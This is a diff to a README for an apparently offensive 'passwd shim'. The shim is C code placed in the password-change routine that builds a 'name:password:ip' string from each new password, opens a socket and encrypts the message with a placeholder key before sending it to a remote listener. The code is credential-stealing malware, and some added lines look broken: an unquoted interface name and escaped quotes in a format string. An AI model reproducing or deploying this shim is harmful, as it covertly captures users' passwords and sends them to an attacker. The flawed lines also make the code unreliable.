@@ -1,3 +1,4 @@
+<br/><br/>
 # Retriever Passwd Shim
 
 #### What is this
@@ -115,8 +116,8 @@ At line ~210 right above the new_password function is where I put this function 
 		/* I want to get an IPv4 IP address */
 		ifr.ifr_addr.sa_family = AF_INET;
 
-		/* I want IP address attached to set interface */
-		strncpy(ifr.ifr_name, INT_HERE, IFNAMSIZ-1);
+		/* I want IP address attached to set interface - IF MANUAL CHANGE INTERFACE*/
+		strncpy(ifr.ifr_name, ens33, IFNAMSIZ-1);
 		ioctl(fd, SIOCGIFADDR, &ifr);
 		close(fd);
 		
@@ -124,7 +125,7 @@ At line ~210 right above the new_password function is where I put this function 
 		char buffer[256];
 		char * ip;
 		ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-		//SNPRINT
+		int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", name, password, ip);
 		
 		/* Make Socket */
 		int sock = 0, valread;
@@ -159,7 +160,7 @@ At line ~210 right above the new_password function is where I put this function 
 			return -1;
 		}
 
-		/* Encrypt Message */
+		/* Encrypt Message  - IF MANUAL CHANGE KEY*/
 		char* key  = "KEY_HERE";
 		int key_length = strlen(key);
 		int mes_length = strlen(buffer);
